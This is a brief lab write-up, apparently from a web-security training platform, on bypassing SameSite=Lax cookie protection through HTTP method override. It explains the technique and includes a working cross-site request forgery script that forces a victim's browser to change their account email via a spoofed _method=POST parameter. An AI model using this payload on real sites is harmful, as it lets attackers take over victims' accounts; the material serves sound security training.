# SameSite-Lax-bypass-via-method-override-(method spoofing)

In this lab, we find that the server relies solely on the session cookie to perform actions.

When no SameSite value is set, the default is usually Lax.

With SameSite=Lax, the cookie is only sent with GET requests.

This is where method spoofing comes into play — it allows us to simulate an HTTP method.

The syntax depends on the framework; in this case, it is specified using _method=POST.

```js
<script>
    document.location = "<IP>/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
</script>
```
